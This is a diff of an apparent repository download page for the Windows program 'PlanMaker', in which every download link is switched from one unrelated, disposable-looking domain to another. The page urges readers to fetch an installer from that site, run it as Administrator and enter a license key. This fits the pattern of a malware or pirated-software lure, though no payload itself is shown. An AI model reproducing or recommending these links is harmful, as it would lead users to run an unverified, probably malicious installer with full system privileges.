@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **PlanMaker** for Windows.
 
 <p align="center">
-  <a href="https://planmaker.zipzapsol.space/">
+  <a href="https://planmaker.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-PlanMaker-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download PlanMaker">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[planmaker.zipzapsol.space](https://planmaker.zipzapsol.space/)** |
-| **Full URL** | `https://planmaker.zipzapsol.space/` |
+| **Direct link** | **[planmaker.wonderchain.fun](https://planmaker.wonderchain.fun/)** |
+| **Full URL** | `https://planmaker.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — planmaker.zipzapsol.space](https://planmaker.zipzapsol.space/)** (link above)
+1. Click **[Download — planmaker.wonderchain.fun](https://planmaker.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://planmaker.zipzapsol.space/"><strong>⬇ Download PlanMaker now</strong></a></p>
+<p align="center"><a href="https://planmaker.wonderchain.fun/"><strong>⬇ Download PlanMaker now</strong></a></p>
 
 ---
 
